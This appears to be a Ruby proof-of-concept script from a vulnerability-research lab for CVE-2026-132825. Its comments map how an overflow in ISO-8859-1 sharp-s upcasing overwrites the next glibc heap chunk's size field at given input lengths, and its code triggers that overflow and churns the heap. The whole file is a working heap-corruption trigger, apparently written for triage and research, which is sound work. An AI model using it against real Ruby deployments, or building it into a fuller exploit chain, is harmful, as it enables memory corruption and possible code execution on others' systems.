# Ruby2Shell consumer-reality probe (plain-glibc build, NOT ASan).
# CVE-2026-132825 — at which N does the sharp-s upcase overflow show
# observable heap damage on this host's production glibc?
#
# Geometry (offsets from the mapping_buffer allocation start):
#   request R = 24 + capa = N+44; chunk C = round16(R+8);
#   write spans [24, 24+2N); own usable = C-8 (includes next chunk's
#   prev_size); NEXT CHUNK SIZE FIELD = [C-8, C).
#   N=21: write end 65 < C-8=72          -> harmless (ASan-only)
#   N=32: end 87 < C-8=88                -> harmless
#   N=33: end 89 in [88,96)             -> first touch, size-field LSBs
#   N=40: end 103, size field 88..95 all 0x53 -> full overwrite (IS_MMAPPED bit set)
# Payload is uniform 0x53 'S' (upcase).
#
# Run (one process per N so a heap abort is attributable):
#   for n in 10 21 32 33 34 36 40 48 64; do
#     GLIBC_TUNABLES=glibc.malloc.check=3 lab/build/plain/ruby-3.4.12-plain/bin/ruby \
#       lab/repro/ruby2shell-rung3-plain.rb $n; echo "N=$n RC=$?"
#   done
# Expected observations worth recording either way:
#   - N<=32 clean -> production glibc sees nothing (negative result
#     for rung 3 at those sizes; the ASan report is the only evidence).
#   - some N aborts in malloc/free ("invalid size", munmap of a
#     garbage mmapped chunk) -> first real production-glibc impact;
#     record the smallest such N and the exact glibc diagnostic.
n = (ARGV[0] || 40).to_i
s = "\xDF".b * n
s.force_encoding(Encoding::ISO_8859_1)
t = s.upcase
print "N=#{n} upcase ok, out len=#{t.bytesize}\n"
t2 = ("\xDF".b * n).force_encoding(Encoding::ISO_8859_1).swapcase
print "N=#{n} swapcase ok, out len=#{t2.bytesize}\n"
# churn: allocate/free around the mapping buffer so glibc touches the
# neighbor (and any corrupted size field) after the overflow.
3000.times { (Array.new(200) { "payload#{object_id}" }).join }
a = []; 500.times { a << ("x" * 64) }
GC.start
print "N=#{n} churn ok\n"
